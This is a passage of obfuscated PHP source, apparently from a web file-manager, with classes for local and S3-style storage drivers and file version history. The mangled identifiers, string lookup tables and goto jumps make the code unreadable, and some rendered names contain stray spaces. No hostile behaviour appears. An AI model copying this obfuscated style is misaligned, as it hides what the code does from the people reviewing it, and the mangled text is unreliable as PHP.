$¯çÔµ”[$Ì×²Çò[76]] = $‘ûó©”©; } else { $ñÚÉ‚Â = @ftp_chdir($this->connect, $‡òûËÎ); if (!$ñÚÉ‚Â) { return !1; } $¯çÔµ”[$Ì×²Çò[33]] = $Ì×²Çò[75]; } return $¯çÔµ”; } protected function _isFolder($ï¯Á¢–½) { $Ø˜—›À¥ =& $_SERVER[ñˆ‹ß¿÷]; if ($ï¯Á¢–½ == $Ø˜—›À¥[12] || $ï¯Á¢–½ == $Ø˜—›À¥[8]) { return !0; } $ íš»ƒĞ = $this->_objectMeta($ï¯Á¢–½); return isset($ íš»ƒĞ[$Ø˜—›À¥[33]]) && $ íš»ƒĞ[$Ø˜—›À¥[33]] == $Ø˜—›À¥[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($‚°µŒÔŠ) { if (substr($‚°µŒÔŠ, 0, 2) == $_SERVER[ñˆ‹ß¿÷][1376]) { $‚°µŒÔŠ = BASIC_PATH . substr($‚°µŒÔŠ, 2); } return $‚°µŒÔŠ; } public function iconvApp($™¸…¯¶é) { $°ÀÅÈ”ä =& $_SERVER[ñˆ‹ß¿÷]; global $config; return $this->iconvTo($™¸…¯¶é, $config[$°ÀÅÈ”ä[1374]], $config[$°ÀÅÈ”ä[1373]]); } public function iconvSystem($š²°÷¼) { $Ö¼÷‹ªÁ =& $_SERVER[ñˆ‹ß¿÷]; global $config; return $this->iconvTo($š²°÷¼, $config[$Ö¼÷‹ªÁ[1373]], $config[$Ö¼÷‹ªÁ[1374]]); } public function getPathOuter($°Œ Š„Â) { $ßâÍ…ãş =& $_SERVER[ñˆ‹ß¿÷]; $º”Í¢·Ë = $this->iconvApp($this->pathBase); $°Œ Š„Â = $this->iconvApp($°Œ Š„Â); if (substr($º”Í¢·Ë, 0, 2) == $ßâÍ…ãş[1376]) { $º”Í¢·Ë = BASIC_PATH . substr($º”Í¢·Ë, 2); } if (substr($°Œ Š„Â, 0, 2) == $ßâÍ…ãş[1376]) { $°Œ Š„Â = BASIC_PATH . substr($°Œ Š„Â, 2); } $º”Í¢·Ë = KodIO::clear($º”Í¢·Ë); $°Œ Š„Â = KodIO::clear($°Œ Š„Â); $°Œ Š„Â = substr($°Œ Š„Â, strlen($º”Í¢·Ë)); if (empty($this->pathDriver)) { return $°Œ Š„Â; } return $this->pathDriver . $ßâÍ…ãş[8] . ltrim($°Œ Š„Â, $ßâÍ…ãş[8]); } public function mkfile($Áøßé˜, $ï¿ÓƒÇ³ = '', $±šÃø‚ = REPEAT_RENAME) { $Áøßé˜ = $this->iconvSystem($Áøßé˜); @touch($Áøßé˜); if ($ï¿ÓƒÇ³) { file_put_contents($Áøßé˜, $ï¿ÓƒÇ³); } @chmod($Áøßé˜, $this->pathAuth); return is_file($Áøßé˜) ? $this->getPathOuter($Áøßé˜) : !1; } public function mkdir($²ÀÔ’ãà, $Ë¡½‡è = REPEAT_SKIP) { $²ÀÔ’ãà = $this->iconvSystem($²ÀÔ’ãà); if (is_dir($²ÀÔ’ãà)) { return $this->getPathOuter($²ÀÔ’ãà); } @mkdir($²ÀÔ’ãà, $this->pathAuth, !0); @chmod($²ÀÔ’ãà, $this->pathAuth); return is_dir($²ÀÔ’ãà) ? $this->getPathOuter($²ÀÔ’ãà) : !1; } public function copyFile($êÍÅ£Ã¿, $Íöİ•š ) { $this->mkdir($this->pathFather($Íöİ•š )); $êÍÅ£Ã¿ = $this->iconvSystem($êÍÅ£Ã¿); $Íöİ•š  = $this->iconvSystem($Íöİ•š ); $¤£Ñİ = copy_64($êÍÅ£Ã¿, $Íöİ•š ); @chmod($Íöİ•š , $this->pathAuth); return $¤£Ñİ ? $this->getPathOuter($Íöİ•š ) : !1; } public function moveFile($ª§­Ù‚, $®ñçÔ£¶) { $this->mkdir($this->pathFather($®ñçÔ£¶)); $ª§­Ù‚ = $this->iconvSystem($ª§­Ù‚); $®ñçÔ£¶ = $this->iconvSystem($®ñçÔ£¶); $²À››Øğ = intval(@rename($ª§­Ù‚, $®ñçÔ£¶)); if (!$²À››Øğ) { if ($²À››Øğ = intval(@copy_64($ª§­Ù‚, $®ñçÔ£¶))) { @unlink($ª§­Ù‚); } } @chmod($®ñçÔ£¶, $this->pathAuth); return $²À››Øğ ? $this->getPathOuter($®ñçÔ£¶) : !1; } public function movePath($§ŸÁù¤Ë, $‚ãÚâÙÑ, $ø—¼Ë‡« = false) { $£¥÷¸Ÿ =& $_SERVER[ñˆ‹ß¿÷]; $§ŸÁù¤Ë = $this->iconvSystem($§ŸÁù¤Ë); $‚ãÚâÙÑ = $this->iconvSystem($‚ãÚâÙÑ); $¹¬»Ë‘Â = rtrim($‚ãÚâÙÑ, $£¥÷¸Ÿ[8]) . $£¥÷¸Ÿ[8] . ($ø—¼Ë‡« ? $ø—¼Ë‡« : get_path_this($§ŸÁù¤Ë)); if (file_exists($¹¬»Ë‘Â)) { return !1; } $ü¢—ì§ğ = intval(@rename($§ŸÁù¤Ë, $¹¬»Ë‘Â)); $ü¢—ì§ğ = file_exists($¹¬»Ë‘Â); return $ü¢—ì§ğ ? $this->getPathOuter($¹¬»Ë‘Â) : !1; } public function delFile($–ßª§¬ù) { $–ßª§¬ù = $this->iconvSystem($–ßª§¬ù); if (!@unlink($–ßª§¬ù)) { @chmod($–ßª§¬ù, $this->pathAuth); if (!@unlink($–ßª§¬ù)) { return !1; } } else { return !0; } } public function delFolder($—Œğ×¤¯) { $¨­ò¼ =& $_SERVER[ñˆ‹ß¿÷]; $—Œğ×¤¯ = $this->iconvSystem($—Œğ×¤¯); if (!is_dir($—Œğ×¤¯)) { return !0; } if (!($¼©ú¯Ûı = opendir($—Œğ×¤¯))) { return !1; } while (($§ÚóÜ­õ = readdir($¼©ú¯Ûı)) !== !1) { if ($§ÚóÜ­õ == $¨­ò¼[10] || $§ÚóÜ­õ == $¨­ò¼[1383]) { continue; } $ƒœ©Å¤£ = $—Œğ×¤¯ . $¨­ò¼[8] . $§ÚóÜ­õ; if (is_file($ƒœ©Å¤£) || is_link($ƒœ©Å¤£)) { if (!unlink($ƒœ©Å¤£)) { chmod($ƒœ©Å¤£, $this->pathAuth); if (!unlink($ƒœ©Å¤£)) { return !1; } } } else { if (is_dir($ƒœ©Å¤£)) { chmod($ƒœ©Å¤£, $this->pathAuth); $ƒœ©Å¤£ = $this->iconvApp($ƒœ©Å¤£); if (!$this->delFolder($ƒœ©Å¤£)) { return !1; } } } } closedir($¼©ú¯Ûı); return rmdir($—Œğ×¤¯); } public function rename($¿íò÷ù, $ÇÎ§²ûÊ) { $ƒš©»€ =& $_SERVER[ñˆ‹ß¿÷]; $›û™ªùˆ = $this->fileNameAuto($this->pathFather($¿íò÷ù), $ÇÎ§²ûÊ); $›û™ªùˆ = $this->iconvSystem($›û™ªùˆ); $¿íò÷ù = $this->iconvSystem($¿íò÷ù); $ğÅµŸšõ = $this->pathFather($¿íò÷ù); $°ş­ãœß = rtrim($ğÅµŸšõ, $ƒš©»€[8]) . $ƒš©»€[8] . $›û™ªùˆ; $®¸ŒÚĞ = @rename($¿íò÷ù, $°ş­ãœß); $°ş­ãœß = $this->iconvApp($°ş­ãœß); return $®¸ŒÚĞ ? $this->getPathOuter($°ş­ãœß) : !1; } public function size($öòéâ„™) { $öòéâ„™ = $this->iconvSystem($öòéâ„™); return filesize_64($öòéâ„™); } public function info($üÜ§ş¸Œ) { $üÜ§ş¸Œ = $this->iconvSystem($üÜ§ş¸Œ); if ($this->isFolder($üÜ§ş¸Œ)) { return $this->folderInfo($üÜ§ş¸Œ); } else { if ($this->isFile($üÜ§ş¸Œ)) { return $this->fileInfo($üÜ§ş¸Œ); } } return !1; } protected function infoChildren($ùÙ¤ƒ‡Ö, &$•¼é„˜ª, $¾áïÇï¥ = true) { $ãÌ³Ôß =& $_SERVER[ñˆ‹ß¿÷]; check_abort_echo(); $ùÙ¤ƒ‡Ö = rtrim($ùÙ¤ƒ‡Ö, $ãÌ³Ôß[8]) . $ãÌ³Ôß[8]; if ($¾áïÇï¥) { $ùÙ¤ƒ‡Ö = $this->iconvSystem($ùÙ¤ƒ‡Ö); } if (!($³Ñ‡ä‚– = @opendir($ùÙ¤ƒ‡Ö))) { return; } while (($òğÙ‚ç• = readdir($³Ñ‡ä‚–)) !== !1) { if ($òğÙ‚ç• == $ãÌ³Ôß[10] || $òğÙ‚ç• == $ãÌ³Ôß[1383]) { continue; } $ï™—à›à = $ùÙ¤ƒ‡Ö . $òğÙ‚ç•; if (is_file($ï™—à›à) || is_link($ï™—à›à)) { $•¼é„˜ª[$ãÌ³Ôß[77]]++; $•¼é„˜ª[$ãÌ³Ôß[76]] += filesize_64($ï™—à›à); } else { if (is_dir($ï™—à›à)) { $•¼é„˜ª[$ãÌ³Ôß[78]]++; $this->infoChildren($ï™—à›à, $•¼é„˜ª, !1); } } } closedir($³Ñ‡ä‚–); } private function folderInfo($Òå•Ìä£, $»ˆ¿°¹¨ = false) { $ÔÛ¬‹Ë =& $_SERVER[ñˆ‹ß¿÷]; $Òå•Ìä£ = rtrim($Òå•Ìä£, $ÔÛ¬‹Ë[8]) . $ÔÛ¬‹Ë[8]; $–°˜ĞŞñ = $this->iconvApp($this->pathThis($Òå•Ìä£)); if ($»ˆ¿°¹¨) { return array($ÔÛ¬‹Ë[32] => $–°˜ĞŞñ, $ÔÛ¬‹Ë[84] => $this->getPathOuter($Òå•Ìä£), $ÔÛ¬‹Ë[33] => $ÔÛ¬‹Ë[75]); } $‚Ñƒ…® = array($ÔÛ¬‹Ë[32] => $–°˜ĞŞñ, $ÔÛ¬‹Ë[84] => $this->getPathOuter($Òå•Ìä£), $ÔÛ¬‹Ë[33] => $ÔÛ¬‹Ë[75], $ÔÛ¬‹Ë[200] => @filectime($Òå•Ìä£), $ÔÛ¬‹Ë[85] => @filemtime($Òå•Ìä£), $ÔÛ¬‹Ë[1386] => @fileatime($Òå•Ìä£), $ÔÛ¬‹Ë[1387] => is_readable($Òå•Ìä£), $ÔÛ¬‹Ë[1388] => is_writable($Òå•Ìä£), $ÔÛ¬‹Ë[1389] => get_mode($Òå•Ìä£)); return $‚Ñƒ…®; } private function fileInfo($¨ìÇÒ¡, $ üœ„Ÿ¦ = false) { $÷±…ï‘ı =& $_SERVER[ñˆ‹ß¿÷]; $’õÈ‘êÆ = $this->iconvApp($this->pathThis($¨ìÇÒ¡)); if ($ üœ„Ÿ¦) { return array($÷±…ï‘ı[32] => $’õÈ‘êÆ, $÷±…ï‘ı[84] => $this->getPathOuter($¨ìÇÒ¡), $÷±…ï‘ı[33] => $÷±…ï‘ı[199], $÷±…ï‘ı[76] => $this->size($¨ìÇÒ¡), $÷±…ï‘ı[174] => $this->ext($’õÈ‘êÆ)); } $ï»îÖß = array($÷±…ï‘ı[32] => $’õÈ‘êÆ, $÷±…ï‘ı[84] => $this->getPathOuter($¨ìÇÒ¡), $÷±…ï‘ı[33] => $÷±…ï‘ı[199], $÷±…ï‘ı[200] => @filectime($¨ìÇÒ¡), $÷±…ï‘ı[85] => @filemtime($¨ìÇÒ¡), $÷±…ï‘ı[1386] => @fileatime($¨ìÇÒ¡), $÷±…ï‘ı[76] => $this->size($¨ìÇÒ¡), $÷±…ï‘ı[174] => $this->ext($’õÈ‘êÆ), $÷±…ï‘ı[1387] => is_readable($¨ìÇÒ¡), $÷±…ï‘ı[1388] => is_writable($¨ìÇÒ¡), $÷±…ï‘ı[1389] => get_mode($¨ìÇÒ¡)); return $ï»îÖß; } public function exist($ÄÖêçŠ) { $ÄÖêçŠ = $this->iconvSystem($ÄÖêçŠ); return @file_exists($ÄÖêçŠ); } public function isFile($üİİ¯«ô) { $üİİ¯«ô = $this->iconvSystem($üİİ¯«ô); return @is_file($üİİ¯«ô); } public function isFolder($“€üóÛ€) { $“€üóÛ€ = $this->iconvSystem($“€üóÛ€); return @is_dir($“€üóÛ€); } public function listPath($ş“Ò¦Á”, $‘¦Âğğ = false) { $¥Åğí•ı =& $_SERVER[ñˆ‹ß¿÷]; $ş“Ò¦Á” = $this->iconvSystem($ş“Ò¦Á”); $ş“Ò¦Á” = rtrim($ş“Ò¦Á”, $¥Åğí•ı[8]) . $¥Åğí•ı[8]; $¡“¨Õ° = array($¥Åğí•ı[82] => array(), $¥Åğí•ı[83] => array()); if (!($Â¤ØıÁ¤ = @opendir($ş“Ò¦Á”))) { return $¡“¨Õ°; } while (($•û­ò¬ = readdir($Â¤ØıÁ¤)) !== !1) { if ($•û­ò¬ == $¥Åğí•ı[10] || $•û­ò¬ == $¥Åğí•ı[1383]) { continue; } $İ¸ƒ­§° = $ş“Ò¦Á” . $•û­ò¬; if (is_file($İ¸ƒ­§°)) { $¡“¨Õ°[$¥Åğí•ı[83]][] = $this->fileInfo($İ¸ƒ­§°, $‘¦Âğğ); } else { $¡“¨Õ°[$¥Åğí•ı[82]][] = $this->folderInfo($İ¸ƒ­§°, $‘¦Âğğ); } } closedir($Â¤ØıÁ¤); return $¡“¨Õ°; } public function listAll($Í…à ü, &$ñºÁ™· = array()) { $ì©À¸•‚ =& $_SERVER[ñˆ‹ß¿÷]; $Í…à ü = $this->iconvSystem($Í…à ü); $Í…à ü = rtrim($Í…à ü, $ì©À¸•‚[8]) . $ì©À¸•‚[8]; if (!($Ãúğò®ı = @opendir($Í…à ü))) { return $ñºÁ™·; } while (($©²Âƒ’¤ = readdir($Ãúğò®ı)) !== !1) { if ($©²Âƒ’¤ == $ì©À¸•‚[10] || $©²Âƒ’¤ == $ì©À¸•‚[1383]) { continue; } $ñÖÎêœ„ = $Í…à ü . $©²Âƒ’¤; if (is_dir($ñÖÎêœ„) && !is_link($ñÖÎêœ„)) { $ñºÁ™·[] = array($ì©À¸•‚[84] => $ñÖÎêœ„ . $ì©À¸•‚[8], $ì©À¸•‚[75] => 1, $ì©À¸•‚[85] => @filemtime($ñÖÎêœ„), $ì©À¸•‚[76] => 0); $this->listAll($ñÖÎêœ„, $ñºÁ™·); } else { $ñºÁ™·[] = array($ì©À¸•‚[84] => $ñÖÎêœ„, $ì©À¸•‚[75] => 0, $ì©À¸•‚[85] => @filemtime($ñÖÎêœ„), $ì©À¸•‚[76] => $this->size($ñÖÎêœ„)); } } closedir($Ãúğò®ı); return $ñºÁ™·; } public function has($ºöŒğµ¶, $Ô‘ÃÊôñ = false, $ÊËô÷¨ = true) { $ó÷¨Ÿ™Ò =& $_SERVER[ñˆ‹ß¿÷]; $ºöŒğµ¶ = $this->iconvSystem($ºöŒğµ¶); $ºöŒğµ¶ = rtrim($ºöŒğµ¶, $ó÷¨Ÿ™Ò[8]) . $ó÷¨Ÿ™Ò[8]; if (!($Òš³İü„ = @opendir($ºöŒğµ¶))) { return !1; } $Ô‚Ÿ„«Ö = 0; $”Øâë… = 0; $•˜“»Ğ = 0; while (($àœÈİ = readdir($Òš³İü„)) !== !1) { if ($àœÈİ == $ó÷¨Ÿ™Ò[10] || $àœÈİ == $ó÷¨Ÿ™Ò[1383]) { continue; } $¦•¦ç¦ = $ºöŒğµ¶ . $àœÈİ; if ($Ô‘ÃÊôñ) { $•˜“»Ğ++; if (@is_file($¦•¦ç¦)) { $Ô‚Ÿ„«Ö++; } else { $”Øâë…++; } if ($•˜“»Ğ > 10000) { break; } continue; } if ($ÊËô÷¨) { if (@is_file($¦•¦ç¦)) { return !0; } } else { if (@is_dir($¦•¦ç¦ . $ó÷¨Ÿ™Ò[8])) { return !0; } } } closedir($Òš³İü„); if ($Ô‘ÃÊôñ) { return array($ó÷¨Ÿ™Ò[207] => $Ô‚Ÿ„«Ö, $ó÷¨Ÿ™Ò[208] => $”Øâë…); } return !1; } public function hashSimple($ôÄó¢ãÊ) { $³Ìî’†˜ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ôÄó¢ãÊ) { return md5($³Ìî’†˜[12]); } $ôÄó¢ãÊ = $this->iconvSystem($ôÄó¢ãÊ); $›àå‹¯„ = $this->size($ôÄó¢ãÊ); $‚¬¸ºŒ¼ = 200; $ïƒ¤Àš = 50; if ($›àå‹¯„ <= $‚¬¸ºŒ¼ * $ïƒ¤Àš) { return $this->hashMd5($ôÄó¢ãÊ) . $›àå‹¯„; } $ÛœëÆ– = $³Ìî’†˜[12]; $ˆ€ÏÀ£È = intval($›àå‹¯„ / $ïƒ¤Àš); $ïüÕÁêğ = fopen($ôÄó¢ãÊ, $³Ìî’†˜[1390]); if (!$ïüÕÁêğ) { return $ÛœëÆ–; } for ($Š†ş¥„Š = 0; $Š†ş¥„Š < $ïƒ¤Àš; $Š†ş¥„Š++) { fseek_64($ïüÕÁêğ, $ˆ€ÏÀ£È * $Š†ş¥„Š); $ÛœëÆ– .= fread($ïüÕÁêğ, $‚¬¸ºŒ¼); } fseek_64($ïüÕÁêğ, $›àå‹¯„ - $‚¬¸ºŒ¼); $ÛœëÆ– .= fread($ïüÕÁêğ, $‚¬¸ºŒ¼); fclose($ïüÕÁêğ); return md5($ÛœëÆ–) . $›àå‹¯„; } public function getContent($ËßèéÎ) { $ËßèéÎ = $this->iconvSystem($ËßèéÎ); return file_get_contents($ËßèéÎ); } public function setContent($Ôå”ó, $åËÓØ„Š = '') { $Ôå”ó = $this->iconvSystem($Ôå”ó); $®«‘è­œ = @file_put_contents($Ôå”ó, $åËÓØ„Š, LOCK_EX); clearstatcache(); @chmod($Ôå”ó, $this->pathAuth); return $®«‘è­œ === !1 ? !1 : !0; } public function fileSubstr($¿ÔË, $ùü’’æ´ = 0, $Òûµ¡§ó = false) { $Ïåôœ‡ =& $_SERVER[ñˆ‹ß¿÷]; $¿ÔË = $this->iconvSystem($¿ÔË); if ($Òûµ¡§ó === !1) { $Òûµ¡§ó = $this->size($¿ÔË); } if ($Òûµ¡§ó <= 0) { return $Ïåôœ‡[12]; } $Ø½©İÇ½ = fopen($¿ÔË, $Ïåôœ‡[1390]); if (!$Ø½©İÇ½) { return !1; } fseek_64($Ø½©İÇ½, $ùü’’æ´); $‹¡Ş€íÍ = fread($Ø½©İÇ½, $Òûµ¡§ó); fclose($Ø½©İÇ½); return $‹¡Ş€íÍ; } public function upload($ı’™Ñä›, $¾Ä¯ôõ–, $»àÚÙ‡ = false, $•µˆšå = REPEAT_REPLACE) { if ($»àÚÙ‡) { return $this->moveFile($¾Ä¯ôõ–, $ı’™Ñä›); } return $this->copyFile($¾Ä¯ôõ–, $ı’™Ñä›); } public function setModifyTime($Êß‰çÌÁ, $•Ñòíí = '') { @touch($Êß‰çÌÁ, intval($•Ñòíí)); } public function download($Úã¢Ñ†ô, $»£ıƒÍ¸) { return $this->iconvSystem($Úã¢Ñ†ô); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ê¨ÓÚ») { parent::__construct($Ê¨ÓÚ»); $this->signatureVersion($_SERVER[ñˆ‹ß¿÷][216]); } public function fileOutLink($“äŞáÁÄ) { $‹¦„ü£Ê =& $_SERVER[ñˆ‹ß¿÷]; if (substr($“äŞáÁÄ, 0, 7) == $‹¦„ü£Ê[1332]) { $“äŞáÁÄ = $‹¦„ü£Ê[1333] . substr($“äŞáÁÄ, 7); } header($‹¦„ü£Ê[161] . $“äŞáÁÄ); die; } } goto D³ËÎáã±¤; eô©›â»‹: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\x63\x65\x5f\150\151\x73\x74\x6f\x72\171"; public function historyCount($Šà¸¹ö¹) { $à½¶¹­è =& $_SERVER[ñˆ‹ß¿÷]; if (!$Šà¸¹ö¹) { return array(); } if (is_string($Šà¸¹ö¹) || is_int($Šà¸¹ö¹)) { $Šà¸¹ö¹ = array($Šà¸¹ö¹); } $ˆë’®¢¿ = array($à½¶¹­è[402], $à½¶¹­è[1869] => $à½¶¹­è[500]); $à«ˆ“ª™ = array($à½¶¹­è[402] => array($à½¶¹­è[7], $Šà¸¹ö¹)); $¶Ôè¨ú = $this->field($ˆë’®¢¿)->where($à«ˆ“ª™)->group($à½¶¹­è[402])->select(); return array_to_keyvalue($¶Ôè¨ú, $à½¶¹­è[402], $à½¶¹­è[500]); } public function addHistory($Ö®ßÀƒ, $˜Ú—©“¯ = '') { $´ŞâçÔª =& $_SERVER[ñˆ‹ß¿÷]; $ƒ”ï¿Ì = array($´ŞâçÔª[417] => $Ö®ßÀƒ[$´ŞâçÔª[402]], $´ŞâçÔª[1655] => isset($Ö®ßÀƒ[$´ŞâçÔª[456]]) ? $Ö®ßÀƒ[$´ŞâçÔª[456]] : $Ö®ßÀƒ[$´ŞâçÔª[454]], $´ŞâçÔª[469] => $Ö®ßÀƒ[$´ŞâçÔª[468]], $´ŞâçÔª[585] => $Ö®ßÀƒ[$´ŞâçÔª[76]], $´ŞâçÔª[2075] => $˜Ú—©“¯); if ($GLOBALS[$´ŞâçÔª[6]][$´ŞâçÔª[89]][$´ŞâçÔª[1216]] >= 1) { $this->historyAutoClear($ƒ”ï¿Ì[$´ŞâçÔª[402]]); $this->add($ƒ”ï¿Ì); } Hook::trigger($´ŞâçÔª[2076], $ƒ”ï¿Ì); Model($´ŞâçÔª[2077])->eventFileEdit($Ö®ßÀƒ[$´ŞâçÔª[402]]); } private function historyAutoClear($¿¿Ï²½³) { $¸±Ë¼Šû =& $_SERVER[ñˆ‹ß¿÷]; $ÒïíäèÅ = Model($¸±Ë¼Šû[777])->get($¸±Ë¼Šû[1238]); $«„ÍˆŸä = $GLOBALS[$¸±Ë¼Šû[6]][$¸±Ë¼Šû[89]][$¸±Ë¼Šû[1216]]; $äêûİôü = $ÒïíäèÅ == $¸±Ë¼Šû[1239] ? min(5, $«„ÍˆŸä) : $«„ÍˆŸä; $äêûİôü = $äêûİôü <= 0 ? 0 : $äêûİôü - 1; if ($äêûİôü >= 500) { return; } $Ãèöš½Ò = array($¸±Ë¼Šû[417] => $¿¿Ï²½³); $ª…êè– = $this->field($¸±Ë¼Šû[2078])->where($Ãèöš½Ò)->order($¸±Ë¼Šû[2072])->select(); if (!$ª…êè– || $äêûİôü >= count($ª…êè–)) { return; } $ëï÷¶˜ò = array_to_keyvalue($ª…êè–, $¸±Ë¼Šû[12], $¸±Ë¼Šû[399]); $ëï÷¶˜ò = array_slice($ëï÷¶˜ò, $äêûİôü); $Œ›±¹á = array_to_keyvalue($ª…êè–, $¸±Ë¼Šû[12], $¸±Ë¼Šû[468]); $Œ›±¹á = array_slice($Œ›±¹á, $äêûİôü); if (!$ëï÷¶˜ò || !$Œ›±¹á) { return; } $Ãèöš½Ò = array($¸±Ë¼Šû[419] => array($¸±Ë¼Šû[7], $ëï÷¶˜ò)); $this->where($Ãèöš½Ò)->delete(); Model($¸±Ë¼Šû[471])->remove($Œ›±¹á); } public function listData($ÕäğÎ¢) { $Î¯Õİ¬¯ =& $_SERVER[ñˆ‹ß¿÷]; $Ë½÷Ò´¸ = array($Î¯Õİ¬¯[417] => $ÕäğÎ¢); $’¥Éû×„ = $Î¯Õİ¬¯[2079]; $Ç„ êî· = $this->field($’¥Éû×„)->where($Ë½÷Ò´¸)->order($Î¯Õİ¬¯[2072])->selectPage(); $this->_listAppendUser($Ç„ êî·[$Î¯Õİ¬¯[369]]); $ÈŞ—Š¤° = Model($Î¯Õİ¬¯[777])->get($Î¯Õİ¬¯[1238]); $®¹³†…€ = 5; if ($ÈŞ—Š¤° == $Î¯Õİ¬¯[1239]) { $Ç„ êî·[$Î¯Õİ¬¯[369]] = array_slice($Ç„ êî·[$Î¯Õİ¬¯[369]], 0, $®¹³†…€); $Ç„ êî·[$Î¯Õİ¬¯[366]] = array($Î¯Õİ¬¯[2080] => 1, $Î¯Õİ¬¯[2081] => 20, $Î¯Õİ¬¯[2082] => 1, $Î¯Õİ¬¯[2083] => count($Ç„ êî·[$Î¯Õİ¬¯[369]])); } return $Ç„ êî·; } protected function _listAppendUser(&$Ş›—Âõ) { $ÛÄî–ß =& $_SERVER[ñˆ‹ß¿÷]; $®Ò³ß¨é = array_to_keyvalue($Ş›—Âõ, $ÛÄî–ß[12], $ÛÄî–ß[1664]); $ û€›¢Ê = Model($ÛÄî–ß[535])->userListInfo($®Ò³ß¨é); foreach ($Ş›—Âõ as &$ã¹ÚŸ„œ) { $¡¨¢´¹Ğ = $ã¹ÚŸ„œ[$ÛÄî–ß[1664]]; $ã¹ÚŸ„œ[$ÛÄî–ß[454]] = $ û€›¢Ê[$¡¨¢´¹Ğ] ? $ û€›¢Ê[$¡¨¢´¹Ğ] : !1; } unset($ã¹ÚŸ„œ); } public function fileInfo($ƒ¼¿¨ÒÕ) { $ÜÇ¦¸Ğ =& $_SERVER[ñˆ‹ß¿÷]; $î€„çÇí = $this->tablePrefix; $„•×‰ò = "{$î€„çÇí}\151\x6f\137\146\x69\154\145\x20\146\x69\154\145\163\40\x6f\x6e\40\146\x69\x6c\145\163\56\x66\x69\154\145\111\x44\x20\75\40\x68\151\163\164\157\x72\171\56\x66\x69\154\x65\111\104"; return $this->alias($ÜÇ¦¸Ğ[2084])->where(array($ÜÇ¦¸Ğ[419] => $ƒ¼¿¨ÒÕ))->join($„•×‰ò, $ÜÇ¦¸Ğ[2085])->find(); } public function removeItem($»ÑñşœÒ) { $é…ËÏ˜Ï =& $_SERVER[ñˆ‹ß¿÷]; $Àˆ·ñ¬ = array($é…ËÏ˜Ï[419] => $»ÑñşœÒ); $ë‡Û Ú = $this->where($Àˆ·ñ¬)->find(); if ($ë‡Û Ú) { $ø“­Ï¡Ş = $this->where($Àˆ·ñ¬)->delete(); Model($é…ËÏ˜Ï[471])->remove($ë‡Û Ú[$é…ËÏ˜Ï[468]]); return $ø“­Ï¡Ş; } return !1; } public function removeBySource($¡Ó¶€è¾) { $’¸’ûçØ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¡Ó¶€è¾) { return !1; } if (!is_array($¡Ó¶€è¾)) { $¡Ó¶€è¾ = array($¡Ó¶€è¾); } $ÅŸ„ßàƒ = array($’¸’ûçØ[417] => array($’¸’ûçØ[7], $¡Ó¶€è¾)); $—ø®£•¯ = $this->field($’¸’ûçØ[469])->where($ÅŸ„ßàƒ)->select(); if ($—ø®£•¯) { $this->where($ÅŸ„ßàƒ)->delete(); $Ù´‚½ÑÒ = array_to_keyvalue($—ø®£•¯, $’¸’ûçØ[12], $’¸’ûçØ[468]); Model($’¸’ûçØ[471])->remove($Ù´‚½ÑÒ); } return !0; } public function setDetail($Ì´’½Ù, $åÚªüÄ») { $úéÌ­¼ =& $_SERVER[ñˆ‹ß¿÷]; return $this->where(array($úéÌ­¼[419] => $Ì´’½Ù))->save(array($úéÌ­¼[2075] => $åÚªüÄ»)); } public function rollbackToItem($ˆ»éâ¬›, $¬Úå˜Ç) { $ÍÜÎè =& $_SERVER[ñˆ‹ß¿÷]; $æÀŞ°€ = Model($ÍÜÎè[832])->sourceInfo($ˆ»éâ¬›); $this->addHistory($æÀŞ°€, LNG($ÍÜÎè[2086])); $ğüÏÏ« = $this->find($¬Úå˜Ç); $¦ÌóÍêÊ = array($ÍÜÎè[468] => $ğüÏÏ«[$ÍÜÎè[468]], $ÍÜÎè[76] => $ğüÏÏ«[$ÍÜÎè[76]], $ÍÜÎè[85] => time(), $ÍÜÎè[456] => USER_ID); Model($ÍÜÎè[832])->where(array($ÍÜÎè[402] => $ˆ»éâ¬›))->save($¦ÌóÍêÊ); return $this->where(array($ÍÜÎè[419] => $¬Úå˜Ç))->delete(); } public function clearSame($Š¡æ×âŞ) { $¶¦î£†Ù =& $_SERVER[ñˆ‹ß¿÷]; $ÙÔŠÃü— = $this->listData($Š¡æ×âŞ); $³°Íã¿é = array_to_keyvalue_group($ÙÔŠÃü—, $¶¦î£†Ù[468]); $å¹ıª = array(); $ªØÁùóĞ = array(); foreach ($³°Íã¿é as $¨…¤¶‡™) { if (!$¨…¤¶‡™ || count($¨…¤¶‡™) <= 1) { continue; } foreach ($¨…¤¶‡™ as $Ü©ŞÙµ) { $å¹ıª[] = $Ü©ŞÙµ[$¶¦î£†Ù[468]]; $ªØÁùóĞ[] = $Ü©ŞÙµ[$¶¦î£†Ù[399]]; } } if (!$ªØÁùóĞ) { return; } $this->where(array($¶¦î£†Ù[399] => array($¶¦î£†Ù[7], $ªØÁùóĞ)))->delete(); Model($¶¦î£†Ù[471])->remove($å¹ıª); } public function userSpace() { $‹ŠÕŞüÑ =& $_SERVER[ñˆ‹ß¿÷]; $ÆÄÒ¢ˆ† = $this->tablePrefix; $½§¶…¾š = array($‹ŠÕŞüÑ[1655] => USER_ID); $¤’ÕŞ®¨ = "{$ÆÄÒ¢ˆ†}\x69\x6f\x5f\146\x69\154\145\x20\x66\x69\x6c\x65\163\40\x6f\156\40\146\x69\154\x65\x73\56\146\x69\154\145\x49\x44\40\75\x20\150\x69\x73\x74\x6f\162\x79\56\x66\151\x6c\145\111\104"; return $this->alias($‹ŠÕŞüÑ[2084])->where($½§¶…¾š)->join($¤’ÕŞ®¨, $‹ŠÕŞüÑ[2085])->sum($‹ŠÕŞüÑ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Šü±Éè) { $êâÅäÓÊ =& $_SERVER[ñˆ‹ß¿÷]; $í‡†«ß = KodIO::fileTypeList(); $®ê®ìŒ“ = $í‡†«ß[$Šü±Éè]; if (!$®ê®ìŒ“) { return array(); } $–Â±¬Ë¢ = $®ê®ìŒ“[$êâÅäÓÊ[174]]; $ıçıÁÀ“ = $êâÅäÓÊ[7]; if (!$®ê®ìŒ“[$êâÅäÓÊ[174]]) { $ŠÌÈï„Â = array_to_keyvalue($í‡†«ß, $êâÅäÓÊ[12], $êâÅäÓÊ[174]); $–Â±¬Ë¢ = implode($êâÅäÓÊ[50], $ŠÌÈï„Â); 